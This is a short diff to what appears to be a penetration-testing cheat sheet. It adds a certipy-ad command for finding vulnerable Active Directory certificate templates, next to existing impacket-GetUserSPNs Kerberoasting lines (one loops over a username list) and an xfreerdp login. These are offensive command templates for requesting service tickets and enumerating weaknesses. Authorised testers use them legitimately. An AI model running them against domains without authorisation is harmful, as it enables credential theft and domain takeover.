@@ -311,6 +311,8 @@ impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
+[*] ADCS
+certipy-ad find -u '$USERNAME'@$TARGET -dc-ip $TARGET -vulnerable -enabled -stdout
 
 [*] RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
